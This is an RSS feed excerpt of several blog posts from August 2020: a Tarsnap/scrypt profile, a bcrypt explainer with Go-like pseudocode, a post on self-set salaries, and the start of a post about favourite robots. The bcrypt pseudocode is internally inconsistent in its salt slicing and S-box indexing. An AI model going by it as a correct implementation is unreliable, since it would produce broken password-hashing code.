when the firewall in his family house<br>
running openbsd crashed due to disk failure. After changing the disk he<br>
did not manage to<br>
figure out how to install OpenBSD so he went with FreeBSD.   While<br>
studying for his doctrine, he got concern<br>
about security, that led him to use freebsd where he later jumped<br>
on as FreeBSD security officer.<br>
Being the FreeBSD’s security officer gave him knowledge of<br>
security holes before anyone else did and<br>
he needed a secure backup solution for storing his files.<br>
After some head scratching, he decided to<br>
go the startup route and create his own backup solution. After<br>
getting several user requests about having<br>
password-protected key storage, Collin created Tarsnap’s<br>
secure cryptographical solution for<br>
protecting keys called “Scrypt”, which later got picked up by several opensource<br>
projects such as the cryptocurrency project Litecoin.</p>

<p>Colin is a very intelligent and trustworthy person, to<br>
improve security when connecting<br>
and staying connected between machines he creates spiped.<br>
Adding a layer of safety on top of just using regular<br>
ssh, to mitigate attacks and weaknesses caused by OpenSSL.</p>

<p>Because scrypt has a heavy resource need, making it hard for<br>
attackers to crack, it became a more secure alternative then the<br>
standard hash functions we use in modern systems such as sha1 and md5.</p>

<p>The project started to growth and it was soon adopted by various larger companies<br>
such as stripe.</p>

<p>If you are interested in finding and submitting bugs in Tarsnaps<br>
own code base, Colin has put up a Bug bounty<br>
rewarding the people that find all kinds of bugs in the code base, a fun<br>
fact is that a majority of the security bugs<br>
that gets submitted is not found by security researchers looking<br>
for holes but by average developers looking at<br>
the functions in the code.</p>

<p>Today Tarsnap runs on a large set of different systems by a diverse<br>
crowd, providing secure storage of<br>
data thanks to its stable code base and amazon s3.</p>

<p>Colin also donates Tarsnap’s December profit to the opensource<br>
community sponsoring the FreeBSD foundation, the EuroBSD<br>
conference, the bsdcan conference, bsdnow podcast and several other projects.</p>

<p>We are super happy to have Colin as a guest on Security Headlines!
Relax and give it a listen at:</p>







<p><a href="https://anchor.fm/firo-solutions/episodes/A-tarsnap-Special-with-Colin-Percival-eikv06">https://anchor.fm/firo-solutions/episodes/A-tarsnap-Special-with-Colin-Percival-eikv06</a></p>

<h3 id="external-links">External links:</h3>

<p><a href="https://github.com/Tarsnap/spiped">https://github.com/Tarsnap/spiped</a><br>
<a href="https://en.wikipedia.org/wiki/Tarsnap">https://en.wikipedia.org/wiki/Tarsnap</a><br>
<a href="https://en.wikipedia.org/wiki/Scrypt">https://en.wikipedia.org/wiki/Scrypt</a><br>
<a href="https://www.tarsnap.com/spiped.html">https://www.Tarsnap.com/spiped.html</a><br>
<a href="https://www.tarsnap.com/kivaloo.html">https://www.Tarsnap.com/kivaloo.html</a><br>
<a href="https://github.com/Tarsnap/spiped">https://github.com/Tarsnap/spiped</a><br>
<a href="https://www.tarsnap.com/open-source.html">https://www.Tarsnap.com/open-source.html</a><br>
<a href="https://github.com/mendsley/bsdiff">https://github.com/mendsley/bsdiff</a><br>
<a href="https://en.wikipedia.org/wiki/Paul_Graham_(programmer">https://en.wikipedia.org/wiki/Paul_Graham_(programmer</a>)</p>

</div></div>]]>
            </description>
            <link>https://blog.firosolutions.com/2020/08/tarsnap-podcast/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24271291</guid>
            <pubDate>Tue, 25 Aug 2020 13:48:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bcrypt Broken Down Step by Step]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24271227">thread link</a>) | @lanecwagner
<br/>
August 25, 2020 | https://qvault.io/2020/08/24/bcrypt-step-by-step/ | <a href="https://web.archive.org/web/*/https://qvault.io/2020/08/24/bcrypt-step-by-step/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text">
			
<p>Bcrypt is a <a href="https://qvault.io/2019/12/30/very-basic-intro-to-key-derivation-functions-argon2-scrypt-etc/">key derivation function</a>, which can be thought of as a slow <a href="https://qvault.io/2020/01/01/very-basic-intro-to-hash-functions-sha-256-md-5-etc/">hash function</a>. Its purpose is to <em>slowly</em> convert a piece of input data to a fixed-size, deterministic, and unpredictable output. A common use-case is to convert a password into an n-bit cryptographic key, which can then be used for safe authentication. </p>



<p>Here at <a href="https://classroom.qvault.io/">Qvault,</a> we use Bcrypt in our security systems. Bcrypt is a very popular password hashing function, so much so that it’s the hash function we currently teach the implementation of in our <a href="https://classroom.qvault.io/">Practical Cryptography</a> course.</p>



<h2>What Bcrypt Looks Like</h2>



<p>Using Bcrypt on the password <em>myPassword123</em> would produce something like the following:</p>



<pre><strong><em>myPassword123</em> </strong>-&gt;
$2y$12$vUw4OU4EAl4w4vC6/lA33OtDSYGhiIdekdT9iOoSs9/ckwrffaEui</pre>



<p>That output can be used to compare against future hashes against to see if the original data matches.</p>



<h2>Why not compare passwords directly?</h2>



<p>In web development,<em> </em>it is insecure to store user’s passwords in plain text. If an attacker were to gain access to the server’s database they could find raw email/password combinations and use them to attack the same users on other sites. </p>



<p>At the <em>very least</em> we must hash user’s passwords, but hash functions like <a href="https://qvault.io/2020/07/08/how-sha-2-works-step-by-step-sha-256/">SHA-2</a> and MD5 are too fast to be secure. Using a KDF like Bcrypt provides security benefits over fast hashes because it is computationally expensive and slow. If an attacker gains access to a database of password hashes made with fast algorithms it is easy for them to “reverse” the hashes by guessing different inputs and seeing if the outputs match.</p>



<p>For example, let’s say the attacker finds the following entry in a database:</p>



<pre>user@gmail.com 5906ac361a137e2d286465cd6588ebb5ac3f5ae955001100bc41577c3d751764</pre>



<p>They can try hashing common passwords like:</p>



<pre>password1 -&gt;
0b14d501a594442a01c6859541bcb3e8164d183d32937b851835442f69d5c94e
password2 -&gt;
6cf615d5bcaac778352a8f1f3360d23f02f34ec182e259897fd6ce485d7870d4
password3 -&gt; 5906ac361a137e2d286465cd6588ebb5ac3f5ae955001100bc41577c3d751764</pre>



<p><br>The password, <code>password3</code>, produced a matching hash! Now the attacker knows that <code>user@gmail.com</code> is likely to use the password <code>password3</code> on other sites and can go hack other accounts. This is only possible because the attacker is able to quickly compute many hashes per second and guess millions of potential passwords.</p>



<p>A slow KDF like Bcrypt solves this problem.</p>



<h2>Bcrypt Output Format</h2>



<pre>$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
\___/\__/\_____________________________/\___________________________________/
Alg   Cost                  Salt                                            Hash</pre>



<ul><li><code>2a</code>: The hash algorithm identifier (Bcrypt)</li><li><code>10</code>: Cost factor (2<sup><code>10</code></sup>&nbsp;= 1,024 rounds of key expansion)</li><li><code>N9qo8uLOickgx2ZMRZoMye</code>: 16-byte (128-bit) salt, base64 encoded to 22 characters</li><li><code>IjZAgcfl7p92ldGxad68LJZdL17lhWy</code>: 24-byte (192-bit) hash, base64 encoded to 31 characters</li></ul>



<p>Direct from <a aria-label="Wikipedia (opens in a new tab)" rel="noreferrer noopener nofollow" href="https://en.wikipedia.org/wiki/Bcrypt#Description" target="_blank">Wikipedia</a></p>



<h2>Bcrypt Explained Step by Step</h2>



<p>Bcrypt can be visualized with the following Go-like pseudo code:</p>



<pre><code lang="go">func bcrypt(cost int, salt [16]byte, password [72]byte) (hash string) {
	// Initialize Blowfish state with expensive key setup algorithm
	// This is the slow part of the algorithm
	pEighteenSubkeys, sFourSubBoxes := expensiveBlowfishSetup(cost, salt, password)

	// Repeatedly encrypt the text "OrpheanBeholderScryDoubt" 64 times
	// 24 bytes = three 64-bit blocks
	ctext := "OrpheanBeholderScryDoubt"
	for i := 0; i &lt; 64; i++ {
		// Encrypt using standard Blowfish in ECB mode
		ctext = encryptECB(pEighteenSubkeys, sFourSubBoxes, ctext)
	}

	// return the version, cost, salt, and ctext in the proper format
	return "$2a${cost}${salt}{ctext}"
}</code></pre>



<p>As you can see, Bcrypt depends heavily on the <a href="https://en.wikipedia.org/wiki/Blowfish_(cipher)" rel="noopener">Blowfish</a> cipher. Put simply, Bcrypt is an expensive key expansion coupled with Blowfish encryption.</p>



<p>The <code>expensiveBlowfishSetup</code> function can be understood by following pseudo code:</p>



<pre><code lang="go">// pEighteenSubkeys: array of 18 subkeys
// sFourSubBoxes: Four substitution boxes
// Each S-Box is a 256-length array of uint32
func expensiveBlowfishSetup(cost int, salt [16]byte, password [72]byte) (pEighteenSubkeys [18]uint32, sFourSubBoxes [4][256]uint32) {
	// Initialize arrays
	pEighteenSubkeys := [18]uint32
	sFourSubBoxes := [4][256]uint32

	// Fill pEighteenSubkeys and sFourSubBoxes with the hex digits of pi 
	// This initial state works as in the original Blowfish algorithm
	// it populates the P-array and S-box entries with the fractional part of pi in hexadecimal
	pEighteenSubkeys = fillWithPi(pEighteenSubkeys)
	sFourSubBoxes = fillWithPi(sFourSubBoxes)

	// Permutate P and S based on the password and salt
	pEighteenSubkeys, sFourSubBoxes = expandKey(pEighteenSubkeys, sFourSubBoxes, salt, password)

	// This is the "Expensive" part of the "Expensive Key Setup"
	// Otherwise the key setup would be identical to Blowfish
	// Expand the key an exponentially increasing number of times
	// depending on the cost factor
	for i := 0; i &lt; math.Pow(2, cost); i++ {
		pEighteenSubkeys, sFourSubBoxes = expandKey(pEighteenSubkeys, sFourSubBoxes, 0, password)
		pEighteenSubkeys, sFourSubBoxes = expandKey(pEighteenSubkeys, sFourSubBoxes, 0, salt)
	}

	return pEighteenSubkeys, sFourSubBoxes
}</code></pre>



<p><code>The expandKey function</code> is executed an exponentially increasing number of times depending on the value of the <code>cost</code> parameter. The <code>expandKey</code> function is explained by the following pseudo-code:</p>



<pre><code lang="go">func expandKey(pEighteenSubkeys [18]uint32, sFourSubBoxes [4][256]uint32, salt [16]byte, password [72]byte) (
	pEighteenSubkeys [18]uint32, sFourSubBoxes [4][256]uint32
	) {

	// Mix password into the pEighteenSubkeys array
	// by XORing password with subkeys
	for i := 0; i &lt; 18; i++{
		// treat the password as cyclic, XOR 32 bit chunks of password with subkeys
		pEighteenSubkeys[i] ^= password[i % 18]
	}
 
   // Treat the 128-bit salt as two 64-bit halves 
   saltHalf[0] = salt[0:63]
   saltHalf[1] = salt[64:127]

   // Initialize an 8-byte (64-bit) buffer with all zeros.
   block := [8]byte

   // Mix internal state into P-boxes   
   for i := 0; i &lt; 9; i++ {
	  // XOR 64-bit block with a 64-bit salt half
	  // Each iteration alternating between saltHalf[0], and saltHalf[1]
      block ^= saltHalf[(i-1) mod 2]

	  // Encrypt block using current key schedule with blowfish block encryption
	  block = Encrypt(pEighteenSubkeys, sFourSubBoxes, block)
	  
	  // Split block and use as new subkeys
      pEighteenSubkeys[2*i] = block[0:31]
	  pEighteenSubkeys[2*i + 1] = block[32:63]
   }

   // Mix encrypted state into the internal S-boxes of state
   for i := 0; i &lt; 4; i ++ {
      for j := 0; j &lt; 127; j++ {
		// Encrypt block using blowfish block encryption
		// where salt[i] is 64 bit chunks
        block = Encrypt(pEighteenSubkeys, sFourSubBoxes, block ^ salt[i])
        sFourSubBoxes[2*i] = block[0:31]
		sFourSubBoxes[2*i + 1] = block[32:63]
	  }
	}
    return pEighteenSubkeys, sFourSubBoxes
}</code></pre>



<p>It helps me to visualize the details of the pseudo-code by using a more “real” programming syntax like Go. If that doesn’t help you then take a look at the code on the <a aria-label="Wikipedia (opens in a new tab)" rel="noreferrer noopener" href="https://en.wikipedia.org/wiki/Bcrypt#Algorithm" target="_blank">Wikipedia</a> page here.</p>



<div><div>
<h2>Thanks For Reading!</h2>



<p>Follow us on Twitter <a href="https://twitter.com/q_vault" rel="noopener">@q_vault</a> if you have any questions or comments</p>



<p>Take game-like coding courses on <a href="https://classroom.qvault.io/#/">Qvault Classroom</a></p>



<p><a href="https://mailchi.mp/5c7f5c281bbe/qvault-newsletter-subscribe" rel="noopener">Subscribe</a> to our Newsletter for more educational articles</p>
</div></div>

		</div></div>]]>
            </description>
            <link>https://qvault.io/2020/08/24/bcrypt-step-by-step/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24271227</guid>
            <pubDate>Tue, 25 Aug 2020 13:42:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Nbuwe/Forth – A Simple Forth]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24271178">thread link</a>) | @todsacerdoti
<br/>
August 25, 2020 | https://hg.sr.ht/~nbuwe/forth/ | <a href="https://web.archive.org/web/*/https://hg.sr.ht/~nbuwe/forth/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://hg.sr.ht/~nbuwe/forth/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24271178</guid>
            <pubDate>Tue, 25 Aug 2020 13:39:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I set my own salary, it blows peoples minds]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24271143">thread link</a>) | @LatteLazy
<br/>
August 25, 2020 | https://granttree.co.uk/i-set-my-own-salary-it-blows-peoples-minds/ | <a href="https://web.archive.org/web/*/https://granttree.co.uk/i-set-my-own-salary-it-blows-peoples-minds/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><span>Happy Bossâ€™s Day! Or is it Merry Bossâ€™s day? Come to think about it, what even is Bossâ€™s day? It sounds like a holiday invented by a search engine or a particularly cloying batch of Hallmark interns.</span></p><p><span>It shouldnâ€™t bother me, I suppose. I’m my own boss, like everyone else at GrantTree. Itâ€™s my day too. So let’s just pretend todayâ€™s a nice excuse for me to buy myself a new mug. We’ll ignore the fact that asking people to thank their boss for being nice is…well…absurd.<br> </span></p><p><span>In truth, there are no â€˜bossesâ€™ at GrantTree. We embrace a unique organisational philosophy called Open Culture, where there are no managers, no subordinates, no hierarchy of personnel. Each employee has autonomous control, or â€˜domainâ€™, over their specific responsibilities. The companyâ€™s functions are assigned to employees (we call them partners) who are interested and qualified to manage them. </span></p><p><span>For example, Iâ€™m in charge of writing GrantTreeâ€™s blog posts. While I can ask my colleagues for their input, Iâ€™m under no obligation to change what I write. There are ways for my colleagues to intervene if I publish something that could damage the company. But otherwise I have free rein. Iâ€™m trusted to do a good job. </span></p><p><span>This isnâ€™t to say thereâ€™s no hierarchy at GrantTree. There is a hierarchy of work. Writing blog posts is part of the work of Marketing, which is part of the work of our Tax Credits business. In this model, work is subordinate to other kinds of work. Blog posts ultimately serve our Tax Credits business, for instance. While still relatively flat, this organisation creates structure.</span></p><p><span>The lack of a â€˜personnel hierarchyâ€™ means each person can make important decisions within their sphere of influence and accountability. We call this system self-management. Self-management has some interesting consequences, aside from the fact I have to write my own Bossâ€™s Day card. For one thing, I canâ€™t get promoted. Not in the traditional sense. Thereâ€™s no â€˜ladderâ€™ to climb. I can choose to take on more responsibility by signing up for more duties, but thereâ€™s no top-down system of appraisal and reward. No one will sit me down in a yearâ€™s time and give me a raise. </span></p><p><span>So what do I do if I deserve a raise? Simple. I give myself one. </span></p><p><span>At GrantTree, we set our own pay. </span></p><p><b>Yes, I really do set my own pay</b></p><p><span>Having partners set their own pay is the ultimate expression of the self-management philosophy. Companies often use self-management as a millennial-baiting euphemism for a handful of fairly superficial freedoms like working remotely or wearing shorts in the office. </span></p><p><span>True self-management goes far beyond relaxing company etiquette. It requires taking control from the upper echelons of management and sewing it into the primary responsibilities of every single employee. Thereâ€™s no better (or more challenging) example of this than empowering staff to adjust their own pay. </span></p><p><span>When I talk to my friends and family about GrantTreeâ€™s radical practices, they give me a suspicious look. But when it comes to the idea of setting my own salary, they look almost aghast. Then they’ll usually ask me â€˜why donâ€™t you just quadruple your salary and be done with it?â€™</span></p><p><span>The simple answer is I, like most people, wouldnâ€™t do that. GrantTree expects partners to act responsibly. Our hiring process thoroughly tests a candidateâ€™s development and maturity. If someone were short-sighted enough to raise their pay to exorbitant levels, they probably wouldn’t be hired in the first place.</span></p><p><span>But moving past this silly example, what would happen if I felt I deserved a reasonable raise? </span></p><p><b>How I change my pay </b></p><p><span>In most jobs, salaries are set by negotiation – a tug of war between company and employee. Salaries are reflections of more than an employeeâ€™s development or market value. They incorporate the strength of both sidesâ€™ bargaining positions and their ability to argue their case. GrantTree removes negotiation from the procedure and places the decision entirely on the shoulders of the partner, via a process called Pay Self-Assessment (PSA for short). Hereâ€™s how it works.</span></p><p><span>There are four stages: We collect data relevant to our salary and performance, we write a proposal for a new salary based on this data, we receive feedback on our proposal and we make a final decision about our pay. </span></p><p><span>1) Data Collection </span></p><p><span>This is where I collect data that will inform my decision about what my salary should be, including information about my performance, my career progression, the market value of my role (i.e. what I could be earning given my skills and experience), and an analysis of the impact my raise will have on the companyâ€™s budgets. Then I look at what this data says. If, for example, the evidence shows I have grown professionally and that the market value for my skills has increased, I can work out a numerical value for my wage increase. Of course, the data could also could lead me to conclude that I should be paid less. PSA isnâ€™t just about raises. Pay decreases are also possible.</span></p><p><span>2) PSA Proposal</span></p><p><span>I then compile this information into a PSA Proposal; a form in which I state my current pay, my proposed new salary, and an explanation for how the data and evidence I have collected supports my proposal for a pay raise. For example, I would point to how the data I have collected indicates professional growth and my market value has increased.</span></p><p><span>3) PSA Feedback</span></p><p><span>A number of my colleagues – those who supplied evidence in the data collection stage – will then review my PSA Proposal to provide feedback and ask questions about the data Iâ€™ve provided. For example, they could suggest that Iâ€™ve misinterpreted the budgetary impact of my proposed wage increase, and that I should lower it. This feedback isnâ€™t binding. Itâ€™s there to advise me on the best course of action, for both me and the company. Â&nbsp;</span></p><p><span>4) PSA Decision</span></p><p><span>Finally, I publish my Pay Decision. This confirms my new salary and also allows me the opportunity to answer questions or concerns my colleagues posed in their feedback to my PSA Proposal. My new salary will take effect the next pay cycle. And voila. Thatâ€™s it. I have my pay raise.</span></p><p><span>The PSA process might seem strange. It did to me, at first. I used to work for a large PR firm where the process for granting raises and promotions was both inscrutable and strictly controlled. But now I can see the benefits of this approach. While a lot of companies underpay employees that have been with them a long time, the PSA process allows us to set our wage at a level that reflects our value to the company.</span></p><p><span>However you prefer to be managed, I hope you feel valued and fairly paid. If you do have a nice manager, maybe get them a card for Bossâ€™s day. Or not. Itâ€™s a silly idea, anyway. </span></p></div></div>]]>
            </description>
            <link>https://granttree.co.uk/i-set-my-own-salary-it-blows-peoples-minds/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24271143</guid>
            <pubDate>Tue, 25 Aug 2020 13:35:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Robots I Love]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24271121">thread link</a>) | @whatrocks
<br/>
August 25, 2020 | https://www.charlieharrington.com/robots-i-love | <a href="https://web.archive.org/web/*/https://www.charlieharrington.com/robots-i-love">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h3>Beware of scissors</h3>
<p>The other day I lopped off a sizeable chunk of my thumbprint while making a robot. The cut? It was one of those bright-red, swiftly-flowing ones, where you're pretty sure you're seeing bone or muscle or some other gross-thing-that-should-probably-stay-inside-your-body. The robot? It was made of cardboard and beer cans:</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/9d940d0f21aec7abb6525a0c3097ef1c/5c744/cardboard.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="cardboard robot" title="cardboard robot" src="https://www.charlieharrington.com/static/9d940d0f21aec7abb6525a0c3097ef1c/a6d36/cardboard.png" srcset="https://www.charlieharrington.com/static/9d940d0f21aec7abb6525a0c3097ef1c/222b7/cardboard.png 163w,
https://www.charlieharrington.com/static/9d940d0f21aec7abb6525a0c3097ef1c/ff46a/cardboard.png 325w,
https://www.charlieharrington.com/static/9d940d0f21aec7abb6525a0c3097ef1c/a6d36/cardboard.png 650w,
https://www.charlieharrington.com/static/9d940d0f21aec7abb6525a0c3097ef1c/e548f/cardboard.png 975w,
https://www.charlieharrington.com/static/9d940d0f21aec7abb6525a0c3097ef1c/5c744/cardboard.png 1206w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span></p>
<p>This little guy is one of many cardboard robots that I've made over the years. During summers, my sister and I would go to Vineland, New Jersey to stay with my aunt and cousins for a glorious week of catching frogs, playing Sega Genesis, eating spoonfuls of iced tea mix, and arts 'n' crafts.</p>
<p>For some reason, we'd always center on a unique theme each year for our arts 'n' crafts. One summer, it was <a href="https://www.charlieharrington.com/create-wonderful-things-be-good-have-fun">Klutz Press friendship bracelets</a>. Another was god's eyes - we made hundreds. Our proudest summer craft of them all? A "working" cardboard R2-D2. If not for a late '90s winter basement flood, Cardboard Artoo would still be with us today.</p>
<p>I decided to try my hand at making another cardboard robot because I've been thinking a lot about them. Mostly because I'm writing a children's novel about robots, but also cause it's summer and that's the sort of thing you do during summer.</p>
<p>There are all kinds of robots, cardboard and not. But there's a certain sort of robot that makes my gears turn. The rest of this post will review my favorite robots (and the kid who loves them).</p>
<h2>Robots I Love</h2>
<h3>R.O.B. (Robotic Operating Buddy)</h3>
<p>It's a robot... for your original Nintendo. I'm embarassed to admit it, but I've never seen a R.O.B. in real-life, despite scouring every local garage sale in New Jersey for years.</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/e2bd304c9728a8ea5a8c8a3e6c78b650/0a47e/rob.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="rob1" title="rob1" src="https://www.charlieharrington.com/static/e2bd304c9728a8ea5a8c8a3e6c78b650/0a47e/rob.png" srcset="https://www.charlieharrington.com/static/e2bd304c9728a8ea5a8c8a3e6c78b650/222b7/rob.png 163w,
https://www.charlieharrington.com/static/e2bd304c9728a8ea5a8c8a3e6c78b650/ff46a/rob.png 325w,
https://www.charlieharrington.com/static/e2bd304c9728a8ea5a8c8a3e6c78b650/0a47e/rob.png 600w" sizes="(max-width: 600px) 100vw, 600px" loading="lazy">
  </a>
    </span></p>
<blockquote>
<p>Source: <a href="https://en.wikipedia.org/wiki/R.O.B.">Wikipedia</a></p>
</blockquote>
<p>These Nintendo ads are just perfection. I'm still more excited for the promise of this system than any game console out today.</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/249e6e5d55d9532ba82345dee293de3a/9c538/rob-1.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="rob2" title="rob2" src="https://www.charlieharrington.com/static/249e6e5d55d9532ba82345dee293de3a/6aca1/rob-1.jpg" srcset="https://www.charlieharrington.com/static/249e6e5d55d9532ba82345dee293de3a/d2f63/rob-1.jpg 163w,
https://www.charlieharrington.com/static/249e6e5d55d9532ba82345dee293de3a/c989d/rob-1.jpg 325w,
https://www.charlieharrington.com/static/249e6e5d55d9532ba82345dee293de3a/6aca1/rob-1.jpg 650w,
https://www.charlieharrington.com/static/249e6e5d55d9532ba82345dee293de3a/7c09c/rob-1.jpg 975w,
https://www.charlieharrington.com/static/249e6e5d55d9532ba82345dee293de3a/01ab0/rob-1.jpg 1300w,
https://www.charlieharrington.com/static/249e6e5d55d9532ba82345dee293de3a/9c538/rob-1.jpg 2550w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span></p>
<p><span>
      <a href="https://www.charlieharrington.com/static/1f2df2dc5f2c9d2e7931bd92c78eef19/a0850/rob-2.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="rob3" title="rob3" src="https://www.charlieharrington.com/static/1f2df2dc5f2c9d2e7931bd92c78eef19/6aca1/rob-2.jpg" srcset="https://www.charlieharrington.com/static/1f2df2dc5f2c9d2e7931bd92c78eef19/d2f63/rob-2.jpg 163w,
https://www.charlieharrington.com/static/1f2df2dc5f2c9d2e7931bd92c78eef19/c989d/rob-2.jpg 325w,
https://www.charlieharrington.com/static/1f2df2dc5f2c9d2e7931bd92c78eef19/6aca1/rob-2.jpg 650w,
https://www.charlieharrington.com/static/1f2df2dc5f2c9d2e7931bd92c78eef19/7c09c/rob-2.jpg 975w,
https://www.charlieharrington.com/static/1f2df2dc5f2c9d2e7931bd92c78eef19/01ab0/rob-2.jpg 1300w,
https://www.charlieharrington.com/static/1f2df2dc5f2c9d2e7931bd92c78eef19/a0850/rob-2.jpg 4096w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span></p>
<p><span>
      <a href="https://www.charlieharrington.com/static/919afde0ddef82184e8b12c4f32a0574/9c538/rob-3.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="rob4" title="rob4" src="https://www.charlieharrington.com/static/919afde0ddef82184e8b12c4f32a0574/6aca1/rob-3.jpg" srcset="https://www.charlieharrington.com/static/919afde0ddef82184e8b12c4f32a0574/d2f63/rob-3.jpg 163w,
https://www.charlieharrington.com/static/919afde0ddef82184e8b12c4f32a0574/c989d/rob-3.jpg 325w,
https://www.charlieharrington.com/static/919afde0ddef82184e8b12c4f32a0574/6aca1/rob-3.jpg 650w,
https://www.charlieharrington.com/static/919afde0ddef82184e8b12c4f32a0574/7c09c/rob-3.jpg 975w,
https://www.charlieharrington.com/static/919afde0ddef82184e8b12c4f32a0574/01ab0/rob-3.jpg 1300w,
https://www.charlieharrington.com/static/919afde0ddef82184e8b12c4f32a0574/9c538/rob-3.jpg 2550w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span></p>
<blockquote>
<p>Source: <a href="https://twitter.com/heyphilsummers/status/1199532600911683585">Twitter</a></p>
</blockquote>
<p>R.O.B. only ever worked with two Nintendo games. From what I've read, neither is very fun. But I'm sure there are some great ROM-hacks out there with more robotic operating buddy interactions.</p>
<h3>Johnny 5</h3>
<p>Duh.</p>
<p>Johnny 5 looks a lot like R.O.B., except with more nuclear-weapons. He loves reading, loves input, loves New York City. A loyal friend, and perhaps a bit too gullible for his own good.</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/def1bd3463f03cf94b8a53217bafb621/7723c/johnny5.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="johnny-5" title="johnny-5" src="https://www.charlieharrington.com/static/def1bd3463f03cf94b8a53217bafb621/7723c/johnny5.jpg" srcset="https://www.charlieharrington.com/static/def1bd3463f03cf94b8a53217bafb621/d2f63/johnny5.jpg 163w,
https://www.charlieharrington.com/static/def1bd3463f03cf94b8a53217bafb621/c989d/johnny5.jpg 325w,
https://www.charlieharrington.com/static/def1bd3463f03cf94b8a53217bafb621/7723c/johnny5.jpg 564w" sizes="(max-width: 564px) 100vw, 564px" loading="lazy">
  </a>
    </span></p>
<blockquote>
<p>Source: <a href="https://synthiam.com/Community/Questions/Original-Movie-Rc-Johnny-5-For-Sale-6415">Synthiam</a></p>
</blockquote>
<p>Major spoiler-alert for Short Circuit 2, but this action sequence gets me every time:</p>
<iframe width="720" height="415" src="https://www.youtube.com/embed/POxMp61Ksbk" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
<h3>Wall-E</h3>
<p>What do you get when you cross R.O.B., Johnny 5, and a Tonka truck? This lil' garbage-collecting cutie!</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/a0029b6a0a4cd8dce5007aece8b5c0e9/eea4a/walle.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="wall-e" title="wall-e" src="https://www.charlieharrington.com/static/a0029b6a0a4cd8dce5007aece8b5c0e9/6aca1/walle.jpg" srcset="https://www.charlieharrington.com/static/a0029b6a0a4cd8dce5007aece8b5c0e9/d2f63/walle.jpg 163w,
https://www.charlieharrington.com/static/a0029b6a0a4cd8dce5007aece8b5c0e9/c989d/walle.jpg 325w,
https://www.charlieharrington.com/static/a0029b6a0a4cd8dce5007aece8b5c0e9/6aca1/walle.jpg 650w,
https://www.charlieharrington.com/static/a0029b6a0a4cd8dce5007aece8b5c0e9/7c09c/walle.jpg 975w,
https://www.charlieharrington.com/static/a0029b6a0a4cd8dce5007aece8b5c0e9/eea4a/walle.jpg 1280w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span></p>
<blockquote>
<p>Source: <a href="https://gsouto-digitalteacher.blogspot.com/2012/04/wall-e-as-green-resource-for-earth-day.html">Blogspot</a></p>
</blockquote>
<p>It's probably becoming quite clear that I'm drawn to a rectangular face on a telescopic neck with tread-like wheels. That's just my type.</p>
<p>I also just discovered this video of someone's real-life Wall-E, and it's frightenly real-looking. Maybe this means I'll get to meet a Wall-E one day, hopefully not on a post-apocalyptic wasteland Earth.</p>
<iframe width="720" height="415" src="https://www.youtube.com/embed/7oVSaUWeKt0" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
<h3>The flying robots from *Batteries Not Included</h3>
<p>I don't remember much about this movie, other than that my sister and I watched the recorded-from-TV VHS tape all the time, and there were these super cute baby flying robots who lived with a bunch of old people in an apartment building in New York City.</p>
<p><span>
      <a href="https://www.charlieharrington.com/static/b82a9f26dcde56c27d022b62cf3e394d/7de01/batteries.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="batteries robots" title="batteries robots" src="https://www.charlieharrington.com/static/b82a9f26dcde56c27d022b62cf3e394d/a6d36/batteries.png" srcset="https://www.charlieharrington.com/static/b82a9f26dcde56c27d022b62cf3e394d/222b7/batteries.png 163w,
https://www.charlieharrington.com/static/b82a9f26dcde56c27d022b62cf3e394d/ff46a/batteries.png 325w,
https://www.charlieharrington.com/static/b82a9f26dcde56c27d022b62cf3e394d/a6d36/batteries.png 650w,
https://www.charlieharrington.com/static/b82a9f26dcde56c27d022b62cf3e394d/7de01/batteries.png 794w" sizes="(max-width: 650px) 100vw, 650px" loading="lazy">
  </a>
    </span></p>
<blockquote>
